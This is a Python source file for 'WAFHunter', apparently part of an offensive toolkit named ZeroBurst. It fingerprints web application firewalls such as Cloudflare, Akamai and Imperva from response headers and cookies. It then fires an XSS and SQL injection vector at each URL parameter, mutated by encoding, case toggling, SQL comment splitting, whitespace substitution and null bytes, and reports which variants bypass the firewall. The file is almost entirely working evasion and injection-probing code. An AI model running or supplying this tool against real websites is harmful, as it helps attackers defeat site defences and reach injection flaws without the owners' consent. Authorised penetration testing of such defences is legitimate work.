import requests
import urllib.parse
import random
import time
from colorama import Fore, Style

class WAFHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-WAFHunter/27.0 (Evasion-Mode)'}
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        
        # SIGNATURE DATABASE (Header/Cookie/Body)
        self.waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid', 'aws waf'],
            'Akamai': ['akamai-ghost', 'akamai-x-cache'],
            'F5 BIG-IP': ['bigipServer', 'tskbw'],
            'Imperva Incapsula': ['incap_ses', 'visid_incap'],
            'ModSecurity': ['mod_security', 'Not Acceptable'],
            'Sucuri': ['sucuri/cloudproxy', 'x-sucuri'],
            'Barracuda': ['barra_counter_session', 'bnYb'],
            'Citrix NetScaler': ['ns_af', 'citrix_ns_id']
        }

    def detect_waf_presence(self):
        """Mendeteksi keberadaan WAF berdasarkan Fingerprint"""
        print(f"\n{Fore.YELLOW}[+] Passive Fingerprinting (Headers & Cookies)...{Style.RESET_ALL}")
        try:
            res = self.session.get(self.target, timeout=10)
            headers = str(res.headers).lower()
            cookies = str(res.cookies).lower()
            
            found_waf = []
            for waf, sigs in self.waf_signatures.items():
                for sig in sigs:
                    if sig.lower() in headers or sig.lower() in cookies:
                        found_waf.append(waf)
                        break
            
            found_waf = list(set(found_waf)) # Remove duplicate
            
            if found_waf:
                print(f"   {Fore.RED}[DETECTED] Active WAF: {', '.join(found_waf)}{Style.RESET_ALL}")
                return found_waf
            else:
                print(f"   {Fore.GREEN}[INFO] No generic WAF signatures found (Custom/Hidden WAF?){Style.RESET_ALL}")
                return []
        except:
            return []

    def generate_bypasses(self, base_payload):
        """
        Mengubah payload menjadi berbagai bentuk mutasi (Obfuscation).
        """
        bypasses = []
        
        # 1. URL Encoding
        bypasses.append({'tech': 'URL Encode', 'pay': urllib.parse.quote(base_payload)})
        
        # 2. Double URL Encode
        bypasses.append({'tech': 'Double URL Encode', 'pay': urllib.parse.quote(urllib.parse.quote(base_payload))})
        
        # 3. Case Toggling (sCrIpT)
        toggled = "".join([char.upper() if random.randint(0,1) else char.lower() for char in base_payload])
        bypasses.append({'tech': 'Case Toggling', 'pay': toggled})
        
        # 4. SQL Comment Injection (Khusus SQLi)
        # UNION SELECT -> UNION/**/SELECT
        if " " in base_payload:
            commented = base_payload.replace(" ", "/**/")
            bypasses.append({'tech': 'SQL Comment Split', 'pay': commented})
            
            # Version Comment
            ver_comment = base_payload.replace(" ", "/*!50000*/")
            bypasses.append({'tech': 'MySQL Version Comment', 'pay': ver_comment})

        # 5. Whitespace Bypass (Tabs/Newlines)
        if " " in base_payload:
            tabs = base_payload.replace(" ", "%09")
            bypasses.append({'tech': 'Tab (%09) Bypass', 'pay': tabs})
            newlines = base_payload.replace(" ", "%0a")
            bypasses.append({'tech': 'Newline (%0a) Bypass', 'pay': newlines})

        # 6. Null Byte Injection
        bypasses.append({'tech': 'Null Byte Injection', 'pay': f"{base_payload}%00"})
        
        # 7. Junk Characters
        # /index.php/junk/..; payload
        bypasses.append({'tech': 'Parameter Pollution', 'pay': f"junk&id={base_payload}"})

        return bypasses

    def active_bypass_test(self):
        """Melakukan tes tembus WAF secara aktif"""
        print(f"\n{Fore.YELLOW}[+] Active WAF Bypass Testing (Mutation Engine)...{Style.RESET_ALL}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters to fuzz. Bypass needs inputs.{Style.RESET_ALL}")
            return

        # Base Payload yang pasti diblokir WAF (Control Test)
        # Kita gunakan payload XSS & SQLi standar
        base_vector = "<script>alert(1)</script> OR 1=1" 
        
        # Cek Baseline (Request Normal)
        try:
            normal_res = self.session.get(self.target, timeout=5)
            normal_code = normal_res.status_code
        except:
            return

        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Targeting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            
            # 1. Tes Blokir (Pastikan WAF bekerja)
            blocked = False
            try:
                test_url = f"{self.base_url}?{param}={base_vector}"
                block_res = self.session.get(test_url, timeout=5)
                if block_res.status_code in [403, 406, 500, 501] or block_res.status_code != normal_code:
                    print(f"   {Fore.RED}[CONFIRMED] WAF is blocking standard payload (Status: {block_res.status_code}).{Style.RESET_ALL}")
                    blocked = True
                else:
                    print(f"   {Fore.GREEN}[WEAK] WAF did not block standard payload. Easy target?{Style.RESET_ALL}")
            except:
                pass

            if not blocked: continue # Jika tidak diblokir, tidak perlu bypass

            # 2. Jalankan Mutasi Bypass
            mutations = self.generate_bypasses(base_vector)
            
            for m in mutations:
                tech = m['tech']
                pay = m['pay']
                
                # Construct URL
                evasion_url = f"{self.base_url}?{param}={pay}"
                
                try:
                    # Kirim Payload Mutasi
                    res = self.session.get(evasion_url, timeout=5)
                    
                    # ANALISIS KESUKSESAN
                    # Jika status code KEMBALI NORMAL (sama dengan normal_code/200), berarti tembus!
                    # Dan bukan 403/406 lagi.
                    if res.status_code == normal_code and res.status_code != 403:
                        print(f"   {Fore.GREEN}[BYPASS SUCCESS] Technique: {tech}{Style.RESET_ALL}")
                        print(f"   ├── Payload: {pay}")
                        print(f"   └── Status : {Fore.YELLOW}{res.status_code}{Style.RESET_ALL} (Allowed)")
                    else:
                        # print(f"   [Failed] {tech} still blocked ({res.status_code})")
                        pass
                        
                except:
                    pass

        print("-" * 60)
        print(f"{Fore.CYAN}[*] WAF Hunt Completed.{Style.RESET_ALL}")

def run_waf_scan(url):
    engine = WAFHunter(url)
    waf_names = engine.detect_waf_presence()
    engine.active_bypass_test()